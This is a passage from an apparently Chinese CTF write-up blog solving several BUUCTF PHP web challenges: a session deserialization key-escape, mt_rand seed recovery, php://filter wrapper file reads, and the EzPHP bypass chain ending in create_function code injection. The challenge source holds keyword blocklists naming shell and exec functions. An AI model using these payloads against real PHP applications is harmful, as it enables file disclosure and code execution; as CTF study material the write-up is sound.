string">";s:3:"</span>hhh"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>读到 flag in /d0g3_fllllllag</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208185028748.png" srcset="/img/loading.gif" alt="image-20201208185028748"></p><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span><span class="token operator">?</span>f<span class="token operator">=</span>show_image<span class="token constant">POST</span><span class="token punctuation">:</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagflagflagflag     <span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>L2QwZzNfZmxsbGxsbGFn<span class="token string">";s:4:"</span>dwm2<span class="token string">";s:3:"</span>hhh"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>得到flag</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208185325887.png" srcset="/img/loading.gif" alt="image-20201208185325887"></p><p>之后看了其他人的wp，发现还有其他方法：</p><p>键名逃逸</p><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>flagphp<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">"db"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">49</span><span class="token punctuation">:</span><span class="token string">";s:2:"</span>db"<span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">></span>丢掉</code></pre><p>也是一样的道理。</p><h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p><strong>考点：php伪随机数</strong></p><p>题目首页给了一组字符串lb1MlXS13a</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208201442568.png" srcset="/img/loading.gif" alt="image-20201208201442568"></p><p>源码里看见check.php，访问一下看见源码。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#这不是抽奖程序的源代码！不许看！</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;p id='p1'>"</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x        <span class="token keyword">echo</span> <span class="token string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>看到mt_rand，伪随机数漏洞。</p><p>先把字母还原</p><pre class=" language-python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>b<span class="token operator">=</span><span class="token string">'lb1MlXS13a'</span>c <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>length <span class="token operator">=</span> len<span class="token punctuation">(</span>b<span class="token punctuation">)</span>res<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            res<span class="token operator">+=</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token number">11</span> <span class="token number">11</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">1</span> <span class="token number">1</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">27</span> <span class="token number">27</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">48</span> <span class="token number">48</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">11</span> <span class="token number">11</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">59</span> <span class="token number">59</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">54</span> <span class="token number">54</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">27</span> <span class="token number">27</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">29</span> <span class="token number">29</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span> <span class="token number">61</span></code></pre><p>工具爆破一下得到seed：949630651</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208201556491.png" srcset="/img/loading.gif" alt="image-20201208201556491"></p><p>再通过seed还原完整字符串</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token string">"949630651"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token operator">--</span><span class="token operator">--</span>lb1MlXS13aqjyh1bbe1R</code></pre><p>输入得到flag。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208201733801.png" srcset="/img/loading.gif" alt="image-20201208201733801"></p><h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p><strong>考点：伪协议</strong></p><p>进来是这样一个页面，点击按钮可以看猫猫或狗狗的照片。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208202834377.png" srcset="/img/loading.gif" alt="image-20201208202834377"></p><p>当url输入引号时，会回显报错。发现include函数。而且句末拼接了.php。</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208202937391.png" srcset="/img/loading.gif" alt="image-20201208202937391"></p><p>扫后台得到</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208203201724.png" srcset="/img/loading.gif" alt="image-20201208203201724"></p><p>尝试伪协议读取</p><pre><code>php://filter/read=convert.base64-encode/resource=flag</code></pre><p>没读到flag,那就先读index试试</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>                <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"woofers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token boolean">false</span> <span class="token operator">||</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"meowers"</span> <span class="token punctuation">)</span> <span class="token operator">!==</span>  <span class="token boolean">false</span> <span class="token operator">||</span> <span class="token function">strpos</span><span class="token punctuation">(</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span><span class="token punctuation">{</span>                        <span class="token keyword">echo</span> <span class="token string">"Sorry, we currently only support woofers and meowers."</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>新学了个技巧，原来php://filter伪协议还能套一层</p><p>payload</p><pre><code>php://filter/read=convert.base64-encode/woofers/resource=flag</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201208204805399.png" srcset="/img/loading.gif" alt="image-20201208204805399"></p><h1 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h1><p><strong>考点：各种PHP特性，create_function()代码注入</strong></p><p>点进来是个威胁实时地图。</p><p>源代码发现hint,解base32:1nD3x.php</p><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209102006443.png" srcset="/img/loading.gif" alt="image-20201209102006443"></p><p>访问它给了源码。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"1nD3x.php"</span><span class="token punctuation">;</span><span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//url编码</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//换行符绕过</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//同时GET+POST传同一个参(preg_match只匹配字符，数组可以逃过检测)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//data://</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//数组</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><p>好嘛，这一题里有一万个绕过。整理一下：</p><p>①整体上有对$_ SERVER和$_REQUEST的限制，</p><p>虽然做了很多过滤，但是$_SERVER[‘QUERY_STRING’]不解码url，可以用url编码绕过；</p><p>$_REQUEST直接不能匹配英文字符，可是我们有许多get传参中需要。</p><p>但$_REQUEST存在解析顺序，按默认来说先GET,后POST;两个同时传，就可以用POST把GET覆盖掉。</p><p>如php.ini中所示：</p><pre class=" language-ini"><code class="language-ini">//php.ini<span class="token comment" spellcheck="true">; This directive determines which super global arrays are registered when PHP</span><span class="token comment" spellcheck="true">; starts up. G,P,C,E &amp;amp; S are abbreviations for the following respective super</span><span class="token comment" spellcheck="true">; globals: GET, POST, COOKIE, ENV and SERVER. There is a performance penalty</span><span class="token comment" spellcheck="true">; paid for the registration of these arrays and because ENV is not as commonly</span><span class="token comment" spellcheck="true">; used as the others, ENV is not recommended on productions servers. You</span><span class="token comment" spellcheck="true">; can still get access to the environment variables through getenv() should you</span><span class="token comment" spellcheck="true">; need to.</span><span class="token comment" spellcheck="true">; Default Value: "EGPCS"</span><span class="token comment" spellcheck="true">; Development Value: "GPCS"</span><span class="token comment" spellcheck="true">; Production Value: "GPCS";</span><span class="token comment" spellcheck="true">; http://php.net/variables-order</span><span class="token constant">variables_order</span> <span class="token attr-value"><span class="token punctuation">=</span> "GPCS"</span><span class="token comment" spellcheck="true">; This directive determines which super global data (G,P &amp;amp; C) should be</span><span class="token comment" spellcheck="true">; registered into the super global array REQUEST. If so, it also determines</span><span class="token comment" spellcheck="true">; the order in which that data is registered. The values for this directive</span><span class="token comment" spellcheck="true">; are specified in the same manner as the variables_order directive,</span><span class="token comment" spellcheck="true">; EXCEPT one. Leaving this value empty will cause PHP to use the value set</span><span class="token comment" spellcheck="true">; in the variables_order directive. It does not mean it will leave the super</span><span class="token comment" spellcheck="true">; globals array REQUEST empty.</span><span class="token comment" spellcheck="true">; Default Value: None</span><span class="token comment" spellcheck="true">; Development Value: "GP"</span><span class="token comment" spellcheck="true">; Production Value: "GP"</span><span class="token comment" spellcheck="true">; http://php.net/request-order</span><span class="token constant">request_order</span> <span class="token attr-value"><span class="token punctuation">=</span> "GP"</span></code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201209131039995.png" srcset="/img/loading.gif" alt="image-20201209131039995"></p><p>②换行符%0A绕过’/^$/’</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'aqua_is_cute'</span><span class="token punctuation">)</span></code></pre><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>debu<span class="token operator">=</span>aqua_is_cute<span class="token operator">%</span><span class="token constant">0A</span>post<span class="token punctuation">:</span>debu<span class="token operator">=</span><span class="token number">1</span></code></pre><p>③伪协议绕file_get_contents</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string">'debu_debu_aqua'</span><span class="token punctuation">)</span></code></pre><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//text/plain,debu_debu_aqua</span>post<span class="token punctuation">:</span>file<span class="token operator">=</span><span class="token number">1</span></code></pre><p>④数组绕sha1</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span></code></pre><p>payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span>shana<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>passwd<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span></code></pre><p>⑤create_function代码注入</p><p>本来以为是无参数RCE，但这过滤的也太多了。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>create_function这个确实没见过，学学。</p><p>create_function：创建一个匿名函数。create_function内部会执行eval函数。</p><p><img 